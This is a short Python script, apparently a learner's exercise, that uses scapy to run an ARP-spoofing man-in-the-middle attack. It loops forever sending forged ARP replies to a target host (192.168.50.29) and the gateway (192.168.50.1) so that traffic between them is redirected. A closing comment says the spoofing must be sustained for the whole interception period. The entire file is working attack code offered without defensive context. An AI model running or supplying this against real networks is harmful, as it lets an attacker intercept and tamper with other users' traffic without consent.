from calendar import c
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #returns list with answered and unanswered ip's 
    return answered_list[0][1].hwsrc
    

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) 
    scapy.send(packet, verbose=False)

send_packets_count = 0
while True:
    spoof("192.168.50.29", "192.168.50.1")
    spoof("192.168.50.1", "192.168.50.29")
    send_packets_count = send_packets_count + 2
    print("[+] Packets sent: " + str(send_packets_count))
    time.sleep(2)






# Notes:
# Need to constantly send the arp responses over the period of MITM
#   arp cache can be reset often or after certain conditions

